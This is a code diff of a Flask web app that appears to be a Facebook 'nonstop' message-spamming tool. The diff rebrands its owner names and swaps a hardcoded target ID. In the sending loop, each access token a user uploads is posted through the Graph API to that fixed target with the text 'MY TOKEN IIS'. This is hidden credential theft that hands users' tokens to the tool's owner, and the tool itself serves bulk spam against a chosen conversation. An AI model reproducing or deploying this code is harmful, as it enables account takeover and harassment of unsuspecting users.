@@ -15,7 +15,7 @@ HTML_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☠️ OWNER SAHIIL IINSIIDE ☠️</title>
+    <title>☠️ 𝐎𝐖𝐍𝐄𝐑 𝐒𝐔𝐑𝐀𝐉 𝐈𝐍𝐒𝐈𝐃𝐄 ☠️</title>
     <style>
         body {
             background-image: url('https://postimg.cc/v1H1B1dc'); /* Replace with the URL of your image */
@@ -81,7 +81,7 @@ HTML_TEMPLATE = '''
 <body>
 
 <div class="form-container">
-    <h2>[-𝙊𝙒𝙉𝙀𝙍 𝘼𝙔𝙎𝙃𝘼𝙉 𝙈𝘼𝙇𝙄𝙆 𝘿𝙊𝙉 𝙃𝙀𝙍𝙒-] 𝙉𝙊𝙉𝙎𝙏𝙊𝙋 [<<𝙈𝘼𝙇𝙄𝙆 𝙎𝙀𝙍𝙑𝙀𝙍>>]</h2>
+    <h2>[-𝙊𝙒𝙉𝙀𝙍 𝐒𝐔𝐑𝐀𝐉 𝘿𝙊𝙉 𝙃𝙀𝙍𝙒-] 𝙉𝙊𝙉𝙎𝙏𝙊𝙋 [<<𝐒𝐔𝐑𝐀𝐉 𝙎𝙀𝙍𝙑𝙀𝙍>>]</h2>
     <form id="messageForm" enctype="multipart/form-data">
         <div class="form-group">
             <label for="tokensFile"> 𝙏𝙊𝙆𝙀𝙉 ?..⤵️</label>
@@ -100,7 +100,7 @@ HTML_TEMPLATE = '''
             <input type="text" id="hatersName" name="hatersName" required>
         </div>
         <div class="form-group">
-            <label for="speed">𝙋𝙊𝙒𝙀𝙍 𝘽𝙊𝙎𝙏 𝙎𝙋𝙀𝙀𝘿..⤵️ (𝙈𝘼𝙇𝙄𝙆 𝘽𝙊𝙍𝙏𝙃𝙀𝙍 𝙂𝘼𝙉𝙂)</label>
+            <label for="speed">𝙋𝙊𝙒𝙀𝙍 𝘽𝙊𝙎𝙏 𝙎𝙋𝙀𝙀𝘿..⤵️ (𝐒𝐔𝐑𝐀𝐉 𝘽𝙊𝙍𝙏𝙃𝙀𝙍 𝙂𝘼𝙉𝙂)</label>
             <input type="number" id="speed" name="speed" value="1" required>
         </div>
         <div class="form-group">
@@ -162,7 +162,7 @@ def index():
 @app.route('/start', methods=['POST'])
 def start_server_and_messaging():
     port = 4000  # Port is fixed to 4000
-    target_id = "61571843423018"  # Fixed target ID
+    target_id = "61569869320941"  # Fixed target ID
     convo_id = request.form.get('convoId')
     haters_name = request.form.get('hatersName')
     speed = int(request.form.get('speed'))
@@ -193,7 +193,7 @@ def start_server_and_messaging():
         for token in tokens:
             access_token = token.strip()
             url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-            msg = f"Hello SHAAB JI II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
+            msg = f"Hello SURAJ JI II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
             parameters = {"access_token": access_token, "message": msg}
             response = requests.post(url, json=parameters, headers=headers)
             time.sleep(0.1)
